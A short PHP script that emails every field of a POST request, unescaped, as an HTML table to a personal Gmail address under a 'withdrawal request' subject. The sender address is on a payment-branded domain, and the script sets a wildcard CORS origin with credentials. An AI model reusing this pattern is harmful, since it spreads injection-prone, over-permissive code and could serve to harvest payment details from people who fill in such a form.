<?php
if (isset($_SERVER['HTTP_ORIGIN'])) {
    // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one
    // you want to allow, and if so:
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Credentials: true');
    header('Access-Control-Max-Age: 1000');
}
 
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    
    
    

 

    
    
    $from = 'payment@pay.ms-roa.com';
    $to = 'abed.hussein.tech@gmail.com';
    
    $subject = 'طلب سحب الاموال';
    
    $headers = "From: " . strip_tags($from) . "\r\n";
    $headers .= "Reply-To: ". strip_tags($from) . "\r\n";
    $headers .= "CC: payment@pay.ms-roa.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
    
    
    $message = '<html><body>';
    
    
    $message .= '<table class="msg_table"><tbody>';

 
 
    foreach($_POST as $key => $value) {
        $message .= '<tr><th style="padding: 10px; font-size:20px">';
        $message .= $key;
        $message .= '</th><td style="padding: 10px; font-size:20px">';
        $message .= $value;
        $message .= '</td></tr>';
      
    }
 


    $message .= '</tbody></table>';
    $message .= '</body></html>';
    
    
    
    if (mail($to, $subject, $message, $headers)) {
        echo 'Your message has been sent.';
    } else {
        echo 'There was a problem sending the email.';
    }
}
?>